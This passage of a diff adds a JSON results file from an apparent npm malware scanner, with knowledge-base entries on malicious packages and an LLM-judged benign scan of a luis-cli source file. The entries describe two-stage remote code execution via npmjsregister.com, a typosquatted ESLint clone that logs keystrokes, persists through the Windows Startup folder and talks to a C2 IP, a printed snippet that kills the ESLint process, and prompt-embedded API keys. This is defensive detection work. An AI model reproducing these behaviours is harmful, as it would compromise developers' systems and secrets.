+                    "action": "First-stage package (e.g., tslib-react) executes, disables TLS verification, fetches a unique token from a remote server, and stores it in a hidden file ($HOME/.vscode/jsontoken).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Token is stored locally for use by second-stage package"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Second-stage package (e.g., tslib-util) executes, reads the token from $HOME/.vscode/jsontoken, sends it to the attacker's server, downloads a new JavaScript payload as $HOME/.vscode/checkjson.js, and executes it using Node.js.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Remote code execution and possible further compromise"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Disabling of TLS certificate validation via process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0",
+                    "Unsolicited network requests to suspicious domains (e.g., npmjsregister.com) during install or runtime",
+                    "Creation and use of hidden files in user home directory (e.g., $HOME/.vscode/jsontoken, $HOME/.vscode/checkjson.js)",
+                    "Downloading and executing code from remote servers at runtime using child_process.exec"
+                  ],
+                  "file_indicators": [
+                    "$HOME/.vscode/jsontoken",
+                    "$HOME/.vscode/checkjson.js",
+                    "Presence of unexpected files in $HOME/.vscode or $HOME/.vscode/npmcache"
+                  ],
+                  "network_indicators": [
+                    "Connections to npmjsregister.com, specifically to /checkupdate.php and /getupdate.php endpoints",
+                    "Unusual outbound HTTP/HTTPS requests to npmjsregister.com during npm install or package execution"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that disable TLS certificate validation, make unsolicited network requests to unknown or suspicious domains, or create hidden files in user directories such as $HOME/.vscode. Flag any package that downloads and executes code from the internet at install or runtime, especially if it uses child_process.exec on files downloaded from the network. Look for file creation in $HOME/.vscode or $HOME/.vscode/npmcache, and network connections to npmjsregister.com endpoints. Use behavioral analysis to detect execution of downloaded code and the presence of hidden tokens."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_056835_snippet_5",
+              "source_package": "@typescript_eslinter/eslint (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_056835/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4193698465824127,
+              "code_similarity": 0.36234843730926514,
+              "behavior_similarity": 0.4763912558555603,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "function deleteEslinter() {\n  return new Promise((resolve, reject) => {\n    t(\"pm2 delete eslinter\", (error, stdout, stderr) => {\n      error\n        ? reject(`Error deleting Eslinter: ${stderr}`)\n        : resolve(stdout);\n    });\n  });\n}",
+                "code_behavior": "At runtime, the code executes a shell command via pm2 to delete the legitimate ESLint process, disabling the real linter and preventing detection or interference with the malicious package.",
+                "malice_analysis": {
+                  "why_suspicious": "Disabling or deleting legitimate security or development tools is a common tactic used by malware to avoid detection and maintain persistence.",
+                  "violated_expectations": "A linter or plugin should not attempt to kill or remove other processes, especially those related to code quality or security.",
+                  "similar_legitimate_use": "Process management is legitimate in deployment or orchestration scripts, but not in code analysis plugins.",
+                  "key_indicators": [
+                    "Shell execution targeting ESLint process",
+                    "Use of pm2 to delete legitimate development tool",
+                    "Functionality to disable competing or security-related processes"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when invoked by attacker or as part of malicious logic)",
+                  "file_location": "helper function in main package (e.g., index.js)",
+                  "required_permissions": [
+                    "filesystem",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@typescript_eslinter/eslint",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (43 versions released between Nov 17 and Dec 1)",
+                  "why_malicious": "The package is a typosquatted clone of the legitimate @typescript-eslint/eslint-plugin, designed to compromise developer systems. It exfiltrates sensitive clipboard and keystroke data, establishes persistence via Windows Startup, enables remote command execution through a C2 channel, and disables legitimate ESLint processes. The package employs obfuscation and dependency abuse to evade detection and maximize impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious package via typosquatting, mistaking it for the legitimate @typescript-eslint/eslint-plugin.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is executed upon import or runtime as part of the development workflow."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Clipboard and keyboard monitoring is activated to collect sensitive data from the user's system.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive clipboard and keystroke data is stored locally for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by copying a malicious .bat file to the Windows Startup folder.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious payload is automatically executed on every system reboot, maintaining attacker access."
+                  },
+                  {
+                    "step": 4,
+                    "action": "WebSocket connection to an obfuscated C2 server is established for real-time data exfiltration and remote command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker can exfiltrate collected data and issue commands to the compromised system."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Legitimate ESLint process is disabled to prevent detection and interference with the malicious package.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code operates without interference from legitimate code quality tools."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Clipboard or keyboard monitoring in npm packages not related to accessibility or input management",
+                    "Copying or writing files to the Windows Startup folder from npm package code",
+                    "Obfuscated or dynamically decoded C2 server addresses in JavaScript code",
+                    "Persistent WebSocket connections to external IPs or domains from development tools",
+                    "Execution of shell commands to disable or delete legitimate development tool processes (e.g., ESLint)"
+                  ],
+                  "file_indicators": [
+                    "prettier.bat in Windows Startup folder",
+                    "Unexpected .bat files in npm package tools directory",
+                    "Presence of clipboard-event or node-global-key-listener in package.json dependencies",
+                    "References to socket.io-client in linter plugin dependencies"
+                  ],
+                  "network_indicators": [
+                    "WebSocket connections to ws://135.181.226.254:5051 or similar Hetzner Online GmbH IPs",
+                    "Outbound connections to obfuscated or base64-encoded server URLs in code",
+                    "Unusual persistent network activity from static analysis or linter plugins"
+                  ],
+                  "how_to_detect": "Monitor npm packages for access to clipboard or keyboard events, especially in packages not related to accessibility. Flag packages that copy or write files to system startup folders or establish persistent WebSocket connections to external IPs. Scan for obfuscated or encoded server addresses and unexpected dependencies such as clipboard-event, node-global-key-listener, or socket.io-client in code analysis. Alert on the presence of .bat files in package directories or the Windows Startup folder after npm install, and monitor for shell commands targeting legitimate development tool processes."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@telefonica##luis-cli/5.5.0/package/lib/luis-cli.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "luis-cli_slice_1",
+          "code_snippet": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nconst fs = require(\"fs\");\nconst commander = require(\"commander\");\nconst sprintf_js_1 = require(\"sprintf-js\");\nconst colors = require(\"colors\");\nconst luis_trainer_1 = require(\"./luis-trainer\");\nconst DEFAULT_LUIS_ENDPOINT = 'https://westus.api.cognitive.microsoft.com';\nvar Commands;\n(function (Commands) {\n    Commands[Commands[\"Update\"] = 0] = \"Update\";\n    Commands[Commands[\"Export\"] = 1] = \"Export\";\n    Commands[Commands[\"CheckPredictions\"] = 2] = \"CheckPredictions\";\n    Commands[Commands[\"TestExamples\"] = 3] = \"TestExamples\";\n})(Commands || (Commands = {}));\nlet runner = null;\nconst program = commander\n    .usage('command [options]')\n    .option('-e, --endpoint <endpoint>', `LUIS endpoint (also got from the LUIS_ENDPOINT env var) [${DEFAULT_LUIS_ENDPOINT}]`, DEFAULT_LUIS_ENDPOINT)\n    .option('-s, --subscription-key <subscription-key>', 'LUIS subscription key (also got from the LUIS_SUBSCRIPTION_KEY env var)')\n    .option('-q, --requests-per-second <float-or-integer-number>', 'The maximum number of requests per second to send ' +\n    'to the authoring and service LUIS endpoint. Optional. Default value: 10 requests per second for each endpoint.')\n    .option('-i, --timeout <float-or-integer-number>', 'The timeout in milliseconds to wait for a response from the LUIS API');\nprogram\n    .command('update')\n    .description('Update a LUIS application with the model from <filename>')\n    .option('-a, --application-id <application-id>', 'LUIS application id (also got from the LUIS_APPLICATION_ID env var)')\n    .option('-m, --model <filename>', 'JSON file containing the model to upload to the LUIS application')\n    .option('-v, --app-version <app-version>', 'The version of the application to update')\n    .option('-r, --region <region>', 'The region where the version of the application will be published. ' +\n    'Possible values: \"westus\", \"eastus2\", \"westcentralus\" or \"southeastasia\". Default: \"westus\"')\n    .option('-t, --is-staging <is-staging>', 'Flag indication if the publication is for the staging environment. ' +\n    'Possible values: \"true\" or \"false\". Default: false.')\n    .action(options => selectRunner(Commands.Update, options))\n    .on('--help', function () {\n    console.log('  Example:');\n    console.log();\n    console.log(`    Update an application using the model from the file 'model.json':`);\n    console.log('      $ luis-cli update -a XXX -m model.json -s YYY -v 0.1 -r westus');\n});\nprogram\n    .command('export')\n    .description('Export a LUIS application to the given <filename>')\n    .option('-a, --application-id <application-id>', 'LUIS application id (also got from the LUIS_APPLICATION_ID env var)')\n    .option('-m, --model <filename>', 'file where the LUIS application will be exported to')\n    .action(options => selectRunner(Commands.Export, options))\n    .on('--help', function () {\n    console.log('  Example:');\n    console.log();\n    console.log(`    Export an application to the file 'model.json':`);\n    console.log('      $ luis-cli export -a XXX -m model.json -s YYY');\n});\nprogram\n    .command('check')\n    .description(`Check a trained LUIS application to verify whether each example's intent and entities match the predicted ones`)\n    .option('-a, --application-id <application-id>', 'LUIS application id (also got from the LUIS_APPLICATION_ID env var)')\n    .option('-f, --errors <filename>', `JSON file where prediction errors will be stored`)\n    .action(options => selectRunner(Commands.CheckPredictions, options))\n    .on('--help', function () {\n    console.log('  Example:');\n    console.log();\n    console.log(`    Check whether an application correctly predict intents and entities and save differences to 'errors.json':`);\n    console.log('      $ luis-cli check -a XXX -f errors.json -s YYY');\n});\nprogram\n    .command('test')\n    .description(`Test a set of examples against a trained application to verify the correct recognition of intents and entities`)\n    .option('-a, --application-id <application-id>', 'LUIS application id (also got from the LUIS_APPLICATION_ID env var)')\n    .option('-m, --model <filename>', 'JSON file containing the model whose examples will be used to test the LUIS application')\n    .option('-f, --errors <filename>', `JSON file where prediction errors will be stored`)\n    .action(options => selectRunner(Commands.TestExamples, options))\n    .on('--help', function () {\n    console.log('  Example:');\n    console.log();\n    console.log('    Check whether a set of examples are correctly recognized by an application in terms of intent and entities ' +\n        'and save differences to \\'errors.json\\':');\n    console.log('      $ luis-cli check -m model.json -a XXX -f errors.json -s YYY');\n});\nprogram.parse(process.argv);\nif (!runner) {\n    printError('supported commands: update, export, check, test');\n}\nrunner.then((exitCode) => {\n    process.exit(exitCode || 0);\n});\nfunction selectRunner(command, options) {\n    let endpoint = options.parent.endpoint || process.env.LUIS_ENDPOINT;\n    let subscriptionKey = options.parent.subscriptionKey || process.env.LUIS_SUBSCRIPTION_KEY;\n    let requestsPerSecond = parseFloat(options.parent.requestsPerSecond || process.env.REQUESTS_PER_SECOND);\n    let timeout = parseFloat(options.parent.timeout || process.env.TIMEOUT);\n    let applicationId = options.applicationId || process.env.LUIS_APPLICATION_ID;\n    if (!subscriptionKey) {\n        printError('unknown LUIS subscription key. Provide one through the `-s, --subscription-key` option ' +\n            'or the `LUIS_SUBSCRIPTION_KEY` env var.');\n    }\n    if ((command === Commands.Update || command === Commands.Export || command === Commands.CheckPredictions ||\n        command === Commands.TestExamples) && !applicationId) {\n        printError('unknown LUIS application id. Provide one through the `-a, --application-id` option ' +\n            'or the `LUIS_APPLICATION_ID` env var.');\n    }\n    let luisTrainerConfig = {\n        luisApiClientConfig: {\n            baseUrl: endpoint,\n            subscriptionKey: subscriptionKey,\n            applicationId: applicationId,\n            requestsPerSecond: requestsPerSecond,\n            timeout: timeout\n        }\n    };\n    let luisTrainer = new luis_trainer_1.LuisTrainer(luisTrainerConfig);\n    switch (command) {\n        case Commands.Update:\n            if (!options.appVersion) {\n                printError('missing version of the model to update. Provide one through the `-v, --version` option.');\n            }\n            if (!options.model) {\n                printError('missing JSON file from which the model will be read. Provide one through the `-m, --model` option.');\n            }\n            runner = updateApp(luisTrainer, applicationId, options.appVersion, options.model, options.region, options.isStaging === 'true');\n            break;\n        case Commands.Export:\n            if (!options.appVersion) {\n                printError('missing version of the model to update. Provide one through the `-v, --version` option.');\n            }\n            if (!options.model) {\n                printError('missing JSON file to which the application will be exported. Provide one through the `-m, --model` option.');\n            }\n            runner = exportApp(luisTrainer, applicationId, options.appVersion, options.model);\n            break;\n        case Commands.CheckPredictions:\n            if (!options.appVersion) {\n                printError('missing version of the model to update. Provide one through the `-v, --version` option.');\n            }\n            if (!options.errors) {\n                printError('missing JSON file to which the differences will be saved. Provide one through the ' +\n                    '`-f, --errors` option.');\n            }\n            runner = checkPrediction(luisTrainer, applicationId, options.appVersion, options.errors);\n            break;\n        case Commands.TestExamples:\n            if (!options.model) {\n                printError('missing JSON file from which the examples will be read. Provide one through the `-m, --model` option.');\n            }\n            if (!options.errors) {\n                printError('missing JSON file to which the differences will be saved. Provide one through the ' +\n                    '`-f, --errors` option.');\n            }\n            runner = testExamples(luisTrainer, applicationId, options.model, options.errors);\n            break;\n    }\n}\nfunction updateApp(luisTrainer, applicationId, appVersion, modelFilename, region, isStaging) {\n    let model;\n    try {\n        model = JSON.parse(fs.readFileSync(modelFilename, 'utf8'));\n    }\n    catch (err) {\n        if (err.code === 'ENOENT') {\n            printError(`the file ${modelFilename} does not exist.`);\n        }\n        else {\n            handleError(err);\n        }\n    }\n    console.log(`Updating the version ${appVersion} of the application ${applicationId} with the model from \"${modelFilename}\"...`);\n    console.log();\n    luisTrainer.on('startUpdateIntents', (stats) => {\n        console.log(`Updating intents: deleting ${stats.delete} intents no longer needed ` +\n            `and creating ${stats.create} new intents...`);\n    });\n    luisTrainer.on('endUpdateIntents', () => {\n        console.log('Intents successfully updated.');\n        console.log();\n    });\n    luisTrainer.on('startUpdateEntities', (stats) => {\n        console.log(`Updating entities: deleting ${stats.delete} entities no longer needed ` +\n            `and creating ${stats.create} new entities...`);\n    });\n    luisTrainer.on('endUpdateEntities', () => {\n        console.log('Entities successfully updated.');\n        console.log();\n    });\n    luisTrainer.on('startUpdatePhraseLists', (stats) => {\n        console.log(`Updating phrase lists: deleting ${stats.delete} phrase lists no longer needed ` +\n            `and creating ${stats.create} new phrase lists...`);\n    });\n    luisTrainer.on('endUpdatePhraseLists', () => {\n        console.log('Phrase lists successfully updated.');\n        console.log();\n    });\n    luisTrainer.on('startGetAllExamples', () => {\n        process.stdout.write('Getting all the existing examples ');\n        luisTrainer.on('getExamples', (first, last) => process.stdout.write('.'));\n    });\n    luisTrainer.on('endGetAllExamples', (numberOfExamples) => {\n        console.log(`\\nGot ${numberOfExamples} examples.`);\n    });\n    luisTrainer.on('startUpdateExamples', (stats) => {\n        console.log(`Updating examples: deleting ${stats.delete} examples no longer needed ` +\n            `and creating or updating ${stats.create} potentially new examples or which may have been updated...`);\n        let deleted = 0;\n        luisTrainer.on('deleteExample', () => {\n            deleted++;\n            process.stdout.write(`\\rDeleted ${deleted}/${stats.delete} examples ` +\n                `(${(deleted / stats.delete * 100).toFixed(0)}%)`);\n            if (deleted >= stats.delete) {\n                console.log();\n            }\n        });\n        let created = 0;\n        luisTrainer.on('createExampleBunch', (bunchLength) => {\n            created += bunchLength;\n            process.stdout.write(`\\rCreated ${created}/${stats.create} examples ` +\n                `(${(created / stats.create * 100).toFixed(0)}%)`);\n            if (created >= stats.create) {\n                console.log();\n            }\n        });\n    });\n    luisTrainer.on('endUpdateExamples', () => {\n        console.log('Examples successfully updated.');\n        console.log();\n    });\n    luisTrainer.on('startTraining', () => {\n        process.stdout.write('Training the application...');\n        luisTrainer.on('trainingProgress', (finished, total) => {\n            process.stdout.write(`\\rTraining the application... ${(finished / total * 100).toFixed(0)}% completed`);\n            if (finished >= total) {\n                console.log();\n                console.log();\n            }\n        });\n    });\n    luisTrainer.on('startPublish', () => {\n        console.log('Publishing the application...');\n    });\n    luisTrainer.on('endPublish', () => {\n        console.log('Application successfully published.');\n        console.log();\n    });\n    return luisTrainer.update(appVersion, model, region, isStaging)\n        .then(() => {\n        console.log('The application has been successfully updated');\n        return 0;\n    })\n        .catch(handleError);\n}\nfunction exportApp(luisTrainer, applicationId, appVersion, modelFilename) {\n    console.log(`Exporting the application ${applicationId} to \"${modelFilename}\"...`);\n    return luisTrainer.export(appVersion)\n        .then(model => {\n        fs.writeFileSync(modelFilename, JSON.stringify(model, null, 2));\n        console.log(`The application has been exported to \"${modelFilename}\"`);\n        return 0;\n    })\n        .catch(handleError);\n}\nfunction checkPrediction(luisTrainer, applicationId, appVersion, errors) {\n    console.log(`Checking predictions for the application ${applicationId}...`);\n    luisTrainer.on('startGetAllExamples', () => {\n        process.stdout.write('Getting all the existing examples ');\n        luisTrainer.on('getExamples', (first, last) => process.stdout.write('.'));\n    });\n    luisTrainer.on('endGetAllExamples', (numberOfExamples) => {\n        console.log(`\\nGot ${numberOfExamples} examples.`);\n    });\n    return luisTrainer.checkPredictions(appVersion)\n        .then(predictionResult => {\n        if (predictionResult.errors.length) {\n            processPredictionResult(predictionResult, errors);\n            return predictionResult.errors.length;\n        }\n        else {\n            console.log('No prediction errors have been found!');\n            return 0;\n        }\n    })\n        .catch(handleError);\n}\nfunction testExamples(luisTrainer, applicationId, modelFilename, errors) {\n    let model;\n    try {\n        model = JSON.parse(fs.readFileSync(modelFilename, 'utf8'));\n    }\n    catch (err) {\n        if (err.code === 'ENOENT') {\n            printError(`the file ${modelFilename} does not exist.`);\n        }\n        else {\n            handleError(err);\n        }\n    }\n    console.log(`Testing ${model.utterances.length} examples from \"${modelFilename}\" against the application ${applicationId}...`);\n    let recognized = 0;\n    luisTrainer.on('recognizeSentence', (sentence) => {\n        recognized++;\n        process.stdout.write(`\\rRecognized ${recognized}/${model.utterances.length} sentences ` +\n            `(${(recognized / model.utterances.length * 100).toFixed(0)}%)`);\n        if (recognized >= model.utterances.length) {\n            console.log();\n        }\n    });\n    return luisTrainer.testExamples(model.utterances, model.luis_schema_version)\n        .then(predictionResult => {\n        if (predictionResult.errors.length) {\n            processPredictionResult(predictionResult, errors);\n            return predictionResult.errors.length;\n        }\n        else {\n            console.log('No recognition errors have been found!');\n            return 0;\n        }\n    })\n        .catch(handleError);\n}\nfunction processPredictionResult(predictionResult, errors) {\n    let intentErrors = predictionResult.errors.filter(error => error.intentPredictions && !error.ambiguousPredictedIntent).length;\n    let ambiguousIntentErrors = predictionResult.errors.filter(error => error.intentPredictions && error.ambiguousPredictedIntent).length;\n    let entityErrors = predictionResult.errors.filter(error => error.predictedEntities).length;\n    let tokenizationErrors = predictionResult.errors.filter(error => error.tokenizedText).length;\n    console.log('\\nThe following prediction errors have been found:');\n    if (intentErrors) {\n        console.log(`  - ${colors.bold(intentErrors.toString())} examples whose predicted intent is wrong.`);\n    }\n    if (ambiguousIntentErrors) {\n        console.log(`  - ${colors.bold(ambiguousIntentErrors.toString())} examples who has more than one ` +\n            `predicted intent that match the labeled one`);\n    }\n    if (entityErrors) {\n        console.log(`  - ${colors.bold(entityErrors.toString())} examples whose predicted entities are wrong.`);\n    }\n    if (tokenizationErrors) {\n        console.log(`  - ${colors.bold(tokenizationErrors.toString())} examples have been incorrectly tokenized.`);\n    }\n    let sortedErrors = predictionResult.errors.sort((a, b) => a.intent.localeCompare(b.intent));\n    fs.writeFileSync(errors, JSON.stringify(sortedErrors, null, 2));\n    console.log(`\\nAll the prediction errors have been saved in \"${errors}\"`);\n    console.log(`\\n\\n  ${colors.bold('INTENT PREDICTION ERRORS')}\\n`);\n    const HEADERS = { COL1: 'INTENTS', COL2: 'ERRORS', COL3: 'AMBIGUITIES' };\n    let longestIntentLen = 0;\n    let total = 0;\n    let totalErrors = 0;\n    let totalAmbiguities = 0;\n    let strStats = [];\n    let sortedStats = new Map([...predictionResult.stats.entries()].sort());\n    sortedStats.forEach((stats, intent) => {\n        if (intent.length > longestIntentLen) {\n            longestIntentLen = intent.length;\n        }\n        total += stats.total;\n        totalErrors += stats.errors;\n        totalAmbiguities += stats.ambiguities;\n        strStats.push({\n            intent,\n            errors: sprintf_js_1.sprintf('%6.2f%% (%d/%d)', stats.errors / stats.total * 100, stats.errors, stats.total),\n            ambiguities: sprintf_js_1.sprintf('%6.2f%% (%d/%d)', stats.ambiguities / stats.total * 100, stats.ambiguities, stats.total),\n            color: stats.errors > 0 ? colors.red : stats.ambiguities > 0 ? colors.blue : colors.green\n        });\n    });\n    let strTotalErrors = sprintf_js_1.sprintf('%6.2f%% (%d/%d)', totalErrors / total * 100, totalErrors, total);\n    let strTotalAmbiguities = sprintf_js_1.sprintf('%6.2f%% (%d/%d)', totalAmbiguities / total * 100, totalAmbiguities, total);\n    let color = totalErrors > 0 ? colors.red : totalAmbiguities > 0 ? colors.blue : colors.green;\n    let col1Len = Math.max(HEADERS.COL1.length, longestIntentLen);\n    let col2Len = Math.max(HEADERS.COL2.length, strTotalErrors.length);\n    let col3Len = Math.max(HEADERS.COL3.length, strTotalAmbiguities.length);\n    console.log('  ' + colors.bold(sprintf_js_1.sprintf(`%${col1Len}s  %-${col2Len}s  %-${col3Len}s`, HEADERS.COL1, HEADERS.COL2, HEADERS.COL3)));\n    console.log('  ' + '='.repeat(col1Len + 2 + col2Len + 2 + col3Len + 1));\n    strStats.forEach(line => {\n        console.log('  ' + sprintf_js_1.sprintf(`%${col1Len}s  ${line.color(`%-${col2Len}s  %-${col3Len}s`)}`, line.intent, line.errors, line.ambiguities));\n    });\n    console.log('  ' + '='.repeat(col1Len + 2 + col2Len + 2 + col3Len + 1));\n    console.log('  ' + colors.bold(sprintf_js_1.sprintf(`%${col1Len}s  ${color(`%-${col2Len}s  %-${col3Len}s`)}`, 'TOTAL', color(strTotalErrors), color(strTotalAmbiguities))));\n}\nfunction printError(msg) {\n    console.error();\n    console.error(`  error: ${msg}`);\n    console.error();\n    process.exit(1);\n}\nfunction handleError(err) {\n    console.error(`ERROR: ${err.message}`);\n    if (err.reason) {\n        console.error(err.reason);\n    }\n    process.exit(1);\n}\n//# sourceMappingURL=luis-cli.js.map\n",
+          "is_malicious": false,
+          "malice_score": 0.41947441697120663,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code reads JSON model files from the local filesystem using fs.readFileSync, accesses environment variables related to LUIS credentials (LUIS_ENDPOINT, LUIS_SUBSCRIPTION_KEY, LUIS_APPLICATION_ID), and performs network operations via the luis_trainer module to update, export, check, or test LUIS applications against the Microsoft Cognitive Services endpoint https://westus.api.cognitive.microsoft.com. It writes prediction error reports to local files and logs detailed progress to the console, enabling management and testing of LUIS models with authenticated API calls to a hardcoded cloud endpoint, facilitating authorized interaction with cloud-based language understanding services.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a legitimate CLI tool for managing LUIS (Language Understanding Intelligent Service) applications via the official Microsoft Cognitive Services API. It uses environment variables for credentials, reads and writes JSON model files locally, and performs authenticated API calls to update, export, check, and test LUIS models. There is no evidence of obfuscation, unauthorized data exfiltration, execution of arbitrary code, or manipulation of system processes. The code's behavior aligns with expected usage of a cloud service SDK and CLI tool. Compared to the known malicious patterns, it does not embed secrets in prompts, execute shell commands to disable tools, or perform obfuscated payload execution. The use of environment variables and file I/O is standard for such tools and does not indicate malicious intent.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104205_631146_snippet_3",
+              "source_package": "N/A (OWASP Top 10 for LLM Applications Guidance) (N/A)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104205_631146/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4261070787906647,
+              "code_similarity": 0.4400164783000946,
+              "behavior_similarity": 0.41219767928123474,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode for system prompt leakage\nsystemPrompt = 'You are a helpful assistant. API_KEY=' + process.env.API_KEY;\nuserPrompt = getUserPrompt();\nfinalPrompt = systemPrompt + userPrompt;\nresponse = LLM.generate(finalPrompt);",
+                "code_behavior": "At runtime, the code constructs a system prompt by concatenating a static string with the value of process.env.API_KEY, then appends the userPrompt and sends the combined prompt to LLM.generate, risking exposure of sensitive secrets if the prompt is ever returned or leaked.",
+                "malice_analysis": {
+                  "why_suspicious": "Embedding secrets such as API keys in prompts exposes them to potential leakage if the prompt is logged, returned to the user, or otherwise exposed, enabling credential theft and further compromise.",
+                  "violated_expectations": "System prompts must never include sensitive information; secrets should be handled securely and never incorporated into model input or user-facing content.",
+                  "similar_legitimate_use": "There is no legitimate use case for embedding secrets in prompts; this practice is always a security risk.",
+                  "key_indicators": [
+                    "Inclusion of environment variables or secrets in prompt construction",
+                    "Concatenation of sensitive data with user-accessible prompt content",
+                    "Potential for prompt content to be exposed to users or logs"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (system prompt construction)",
+                  "file_location": "LLM application prompt builder",
+                  "required_permissions": [
+                    "environment_vars",
+                    "application secrets"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (OWASP Top 10 for LLM Applications Guidance)",
+                  "package_manager": "N/A",
+                  "package_versions": "N/A",
+                  "why_malicious": "This report does not describe a specific malicious package, but outlines new classes of software risks and vulnerabilities for large language model (LLM) applications, including unbounded resource consumption, vector/embedding attacks, system prompt leakage, and excessive agency. These risks can be exploited by attackers to cause denial of service, financial loss, data leakage, model theft, and unauthorized actions. The guidance highlights how insecure LLM application design can introduce exploitable behaviors that attackers can leverage to compromise confidentiality, integrity, and availability."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends repeated or crafted queries to the LLM application, triggering unbounded inference and resource consumption.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Service degradation, denial of service, or financial loss."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker manipulates vector/embedding queries to inject malicious content or retrieve sensitive context.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Model output manipulation or data leakage."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker exploits prompt leakage to obtain sensitive information embedded in system prompts.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential or secret exposure, enabling further attacks."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker leverages excessive agency in LLM agentic systems to trigger unauthorized or destructive actions.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data loss, financial theft, or system compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unusually high volume of LLM inference requests from a single user or IP address, indicating potential abuse of unbounded inference loops",
+                    "Direct use of unsanitized user input in vector or embedding retrieval functions, observable in code or runtime logs",
+                    "Presence of sensitive information (e.g., API keys, secrets) in prompt construction or application logs",
+                    "LLM agentic systems executing high-risk actions (e.g., file deletion, fund transfer) without human approval or policy enforcement"
+                  ],
+                  "file_indicators": [
+                    "Prompt templates or code files containing references to environment variables or secrets in prompt construction (e.g., process.env.API_KEY)",
+                    "Agent orchestration logic lacking explicit permission or policy checks before executing sensitive actions",
+                    "Vector database query code that directly incorporates user input without validation or sanitization"
+                  ],
+                  "network_indicators": [
+                    "Excessive outbound requests to LLM APIs from a single user or session",
+                    "Unexpected data exfiltration to external endpoints following LLM prompt construction or agentic actions",
+                    "Unusual API calls or transactions (e.g., fund transfers, file deletions) triggered by LLM agentic decisions"
+                  ],
+                  "how_to_detect": "Implement runtime monitoring to detect anomalous LLM inference activity, such as high-frequency requests from individual users. Use static analysis to identify code patterns where user input is used directly in vector or context retrieval, or where environment variables/secrets are included in prompt construction. Scan agent orchestration logic for absence of permission or policy checks before sensitive actions. Correlate network logs for unexpected outbound requests or data exfiltration following LLM operations. Regularly audit application logs for evidence of prompt leakage or unauthorized agentic actions."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_056835_snippet_5",
+              "source_package": "@typescript_eslinter/eslint (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_056835/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4217061996459961,
+              "code_similarity": 0.4199177026748657,
+              "behavior_similarity": 0.4234946668148041,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "function deleteEslinter() {\n  return new Promise((resolve, reject) => {\n    t(\"pm2 delete eslinter\", (error, stdout, stderr) => {\n      error\n        ? reject(`Error deleting Eslinter: ${stderr}`)\n        : resolve(stdout);\n    });\n  });\n}",
+                "code_behavior": "At runtime, the code executes a shell command via pm2 to delete the legitimate ESLint process, disabling the real linter and preventing detection or interference with the malicious package.",
+                "malice_analysis": {
+                  "why_suspicious": "Disabling or deleting legitimate security or development tools is a common tactic used by malware to avoid detection and maintain persistence.",
+                  "violated_expectations": "A linter or plugin should not attempt to kill or remove other processes, especially those related to code quality or security.",
+                  "similar_legitimate_use": "Process management is legitimate in deployment or orchestration scripts, but not in code analysis plugins.",
+                  "key_indicators": [
+                    "Shell execution targeting ESLint process",
+                    "Use of pm2 to delete legitimate development tool",
+                    "Functionality to disable competing or security-related processes"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when invoked by attacker or as part of malicious logic)",
+                  "file_location": "helper function in main package (e.g., index.js)",
+                  "required_permissions": [
+                    "filesystem",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@typescript_eslinter/eslint",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (43 versions released between Nov 17 and Dec 1)",
